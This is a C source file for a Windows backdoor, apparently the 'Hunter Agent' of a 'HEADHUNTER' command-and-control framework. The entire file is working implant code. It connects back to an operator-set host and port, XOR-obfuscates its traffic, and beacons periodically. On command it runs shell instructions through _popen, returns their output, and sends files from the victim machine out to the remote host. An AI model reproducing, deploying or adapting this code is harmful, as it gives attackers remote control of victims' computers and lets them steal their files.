#include <winsock2.h>
#include <windows.h>
#include <io.h>
#include <process.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "helpers.c"
#include "payload_common.h"

#define MAXBUF 65536
#define SIZE 1024

char* CLIENT_IP = LHOST;
int CLIENT_PORT = PORT;
char* key = KEY;
char buf[MAXBUF];
int beaconing;

DWORD WINAPI Callback(LPVOID lpParam) {
    SOCKET sock = *((SOCKET*)lpParam);

    char* callback = "--HEADHUNTER BEACON--";
    char* xorcallback = XOR(callback, key, strlen(callback), strlen(key));

    while (1) {
    	int n = send(sock , xorcallback, strlen(callback), 0);
	if(n == SOCKET_ERROR){
		if(WSAGetLastError() == WSAEWOULDBLOCK){
			Sleep(100);
		}
	}
	Sleep(300000);
    }

    return 0;
}

int sendfile(FILE* fp, int fd, char* key)
{
        char data[SIZE] = {0};
        
        while(fgets(data, SIZE, fp) != NULL) {
                char* xordata = XOR(data, key, SIZE, strlen(key));
                if (send(fd, xordata, sizeof(data), 0) == -1) {
			free(xordata);
                        exit(1);
                }
                free(xordata);
        }
        char* eof = "--HEADHUNTER EOF--";
        char* xoreof = XOR(eof, key, strlen(eof), strlen(key));
        send(fd, xoreof, strlen(eof), 0);
        free(xoreof);
        return 0;
}

int main(void) {

	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2 ,2), &wsaData) != 0) {
		write(2, "[ERROR] WSASturtup failed.\n", 27);
		return (1);
	}
	
	int keylen = strlen(key);
	int n = 0;
	int port = CLIENT_PORT;
	struct sockaddr_in sa;
	int connection_established;
	SOCKET sock = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
	sa.sin_family = AF_INET;
	sa.sin_port = htons(port);
	sa.sin_addr.s_addr = inet_addr(CLIENT_IP);

	#ifdef WAIT_FOR_CLIENT
	while (connect(sock, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
		Sleep(5000);
	}
#else
	if (connect(sock, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
		return (1);
	}
#endif

	u_long mode = 1;
	ioctlsocket(sock, FIONBIO, &mode);

	HANDLE hThread = CreateThread(NULL, 0, Callback, &sock, 0, NULL);
	Sleep(1000);
	char* xorhello = XOR("Hunter Agent v1.0\n", key, 18, keylen);
        send(sock, xorhello, 18, 0);
	free(xorhello);
        while((n = recv(sock, buf, MAXBUF, 0)) != 0)
        {
		if(n == SOCKET_ERROR){
			if(WSAGetLastError() == WSAEWOULDBLOCK){
				Sleep(100);
				continue;
			}

			Sleep(100);
		}
        	char* xorbuf = XOR(buf, key, n, keylen);
                // TODO: Revamp argument parsing (there's a better way! :)
                if(strncmp(xorbuf, "help\n", 5) == 0)
                {
                	char* xorhelp = XOR(MSG_HELP, key, strlen(MSG_HELP), keylen);
                        send(sock, xorhelp, strlen(MSG_HELP), 0);
			free(xorhelp);
                }

		else if(str_starts_with(xorbuf, "shell") == 0)
		{
			char* cmd = split(xorbuf, " ");
			FILE* fp;
			char* terminated;
			fp = _popen(cmd, "r");
			if(fp == NULL) {
            	            char* error = "Failed to run command\n";
                            char* xorerror = XOR(error, key, strlen(error), keylen);
                            send(sock, xorerror, strlen(error), 0);
			    free(xorerror);
                                            
                        }

			char path[2050];
                        char command[12000];
                        while (fgets(path, sizeof(path), fp) != NULL) {
				strncat(command, path, sizeof(path));
                        }
                        char* xordata = XOR(command, key, strlen(command), keylen);
			
                        send(sock, xordata, strlen(command), 0);
			free(xordata);
			memset(command, '\0', strlen(command));

		}
		
		else if(str_starts_with(xorbuf, "download") == 0){
                        
                                char* cmd = split(xorbuf, " ");
				char* cmdtunc = newline_terminator(cmd);
                                cmd[strlen(cmd)-1] = '\0'; // Remove newline
				printf("Strlen is: %i\n", strlen(cmdtunc));
                                FILE* fp = fopen(cmdtunc, "r");
                                if(fp == NULL){
                                        
                                        char* openerr = "[-] Error opening file\n";
                                        char* xoropenerr = XOR(openerr, key, strlen(openerr), keylen);
                                        send(sock, xoropenerr, strlen(openerr), 0);
                                        free(xoropenerr);
                                        continue;

                                }
                                else{
				
                                        char* download = "--HUNTER DOWNLOAD--";
                                        char* xordownload = XOR(download, key, strlen(download), keylen);
                                        char confirm[5];
                                        send(sock, xordownload, strlen(download), 0);
                                        recv(sock, confirm, 5, 0);
                                        char* xorconfirm = XOR(confirm, key, 5, keylen);
                                        if(strcmp(xorconfirm, "OK") == 0){
                                                sendfile(fp, sock, key);
                                        }
                                        else{
						continue;
                                        }
				}
                        
                }
		else if(str_starts_with(xorbuf, "exit") == 0){
			
			char* disconnect = "[+] Hunter agent: OK\n";
			char* xordisconnect = XOR(disconnect, key, strlen(disconnect), keylen);
			write(sock, xordisconnect, strlen(disconnect));
			free(xordisconnect);
			CloseHandle(hThread);
			WSACleanup();
			closesocket(sock);
			return 0;
		}

		else if(strncmp(xorbuf, "\n", 1) == 0)
                {
                        char* xornewline = XOR("\n", key, 1, keylen);
                        send(sock, xornewline, 1, 0);
			free(xornewline);
                }

                else
                {
                        char* xorinvalid = XOR(MSG_INVALID, key, strlen(MSG_INVALID), keylen);
                        send(sock, xorinvalid, strlen(MSG_INVALID), 0);
			free(xorinvalid);
                }

	}
	return (0);
}
